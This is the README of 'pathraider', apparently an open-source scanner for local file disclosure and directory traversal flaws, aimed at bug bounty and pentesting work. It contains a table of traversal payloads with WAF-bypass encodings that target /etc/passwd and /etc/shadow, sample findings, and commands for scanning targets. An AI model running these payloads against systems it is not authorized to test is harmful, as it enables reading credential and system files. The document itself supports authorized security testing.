<div align="center">

# pathraider

**Offensive LFD and Directory Traversal scanner**

Detects Local File Disclosure and Directory Traversal vulnerabilities with automatic encoding bypass (URL, double URL, Unicode, null byte). Built for bug bounty triage and web pentesting.

![Language](https://img.shields.io/badge/Python-3.8+-9E4AFF?style=flat-square&logo=python&logoColor=white)
![Version](https://img.shields.io/badge/version-1.1.0-9E4AFF?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-9E4AFF?style=flat-square)
![Category](https://img.shields.io/badge/Category-Bug%20Bounty%20%7C%20Pentesting-111111?style=flat-square)

*by [theoffsecgirl](https://github.com/theoffsecgirl)*

> 🇪🇸 [Versión en español](README.es.md)

</div>

---

```text
┌──────────────────────────────────────────────────────┐
│                                                      │
│  ██████╗  ██████╗ ███████╗██╗  ██╗                │
│  ██╔══██╗██╔════╝ ██╔════╝██║  ██║                │
│  ██████╔╝███████╗█████╗  ███████║                │
│  ██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║                │
│  ██║     ╚██████╔╝███████╗██║  ██║                │
│  ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝                │
│                                                      │
│  ██████╗  ██████╗ ██╗ █████╗  ██████╗        │
│  ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝        │
│  ██████╔╝██████╔╝██║██║  ██║█████╗          │
│  ██╔═══╝ ██╔══██╗██║██║  ██║██╔══╝          │
│  ██║     ██║  ██║██║╚█████╔╝╚██████╗        │
│  ╚═╝     ╚═╝  ╚═╝╚═╝ ╚════╝  ╚═════╝        │
│                                                      │
│    LFD & Directory Traversal scanner  v1.1.0         │
│    encodings: plain · %2e · double · unicode · null  │
│    by theoffsecgirl                                  │
└──────────────────────────────────────────────────────┘
```

---

## What does it do?

Checks whether a web application parameter allows reading local system files (LFD / Path Traversal). Automatically generates encoding variants to bypass filters and WAFs.

---

## Features

- Single target (`--url`) or multiple from file (`--list`)
- Injection via `FUZZ` marker or configurable parameter (`--param`)
- **132 test paths** auto-generated from 12 base paths with encodings:
  - Plain, `%2e%2e%2f`, double encoding, `..%2f`, backslash, `..%5c`, unicode overlong, `%c0%ae`, null byte
- Heuristic detection of sensitive content (`/etc/passwd`, `win.ini`, etc.)
- Concurrent scanning with threads
- JSON export

---

## Bypass techniques

pathraider automatically tries multiple encoding variants per payload:

| Technique | Example |
|-----------|---------|
| Plain | `../../../etc/passwd` |
| URL encoded | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| Double URL encoded | `%252e%252e%252f` |
| Unicode | `..%c0%af..%c0%af` |
| Null byte | `../../../etc/passwd%00.jpg` |
| Mixed | `....//....//etc/passwd` |

---

## Output example

```text
[*] Target: https://example.com/download?file=
[*] Payloads: 180 | Encodings: 6 variants each

[!] LFI found → https://example.com/download?file=../../../../etc/passwd
    Payload: ../../../../etc/passwd
    Encoding: plain
    Match: root:x:0:0

[!] LFI found → https://example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow
    Payload: ../../../../etc/shadow
    Encoding: url-encoded
    Match: root:$6$

[+] Vulnerabilities found: 2
[+] Results saved → results.json
[*] Scan completed in 3.2s
```

---

## When to use it

- Parameter takes a filename or path (`?file=`, `?path=`, `?doc=`, `?template=`)
- File download endpoints
- PDF/image generators that fetch local files
- Any endpoint that reads from the filesystem

---

## Installation

```bash
git clone https://github.com/theoffsecgirl/pathraider.git
cd pathraider
pip install -e .
pathraider --help
```

---

## Usage

```bash
# Scan with FUZZ marker
pathraider -u "https://example.com/download.php?file=FUZZ"

# With parameter
pathraider -u "https://example.com/get.php" -p file

# List of targets
pathraider -L scope.txt -T 20

# Export JSON
pathraider -L scope.txt --json-output results.json

# Show version
pathraider --version
```

---

## Parameters

```text
-u, --url          Target URL (can contain FUZZ)
-L, --list         File with list of targets
--paths            Custom traversal paths
-p, --param        Parameter without FUZZ (default: file)
-t, --timeout      Timeout per request (default: 5)
-T, --threads      Threads per target (default: 10)
-A, --agent        Custom User-Agent
--insecure         Disable TLS verification
--json-output      Save results to JSON
-v, --verbose      More output
    --version      Show version
```

---

## Workflow integration

```bash
# Quick test on a specific parameter
pathraider -u 'https://target.com/download?file=test'

# With custom depth and timeout
pathraider -u 'https://target.com/file?path=test' -d 10 -t 15

# Export to JSON for report
pathraider -u 'https://target.com/doc?name=test' --json-output findings.json

# Scan a list of targets from file
pathraider -L urls.txt -T 20 --json-output findings.json
```

---

## Contributing

PRs welcome. Especially interested in:
- New encoding bypass variants
- False positive reduction
- New file targets (Windows paths, cloud metadata endpoints)

---

## Ethical use

For bug bounty, labs and authorized audits only.

---

## License

MIT · [theoffsecgirl](https://theoffsecgirl.com)
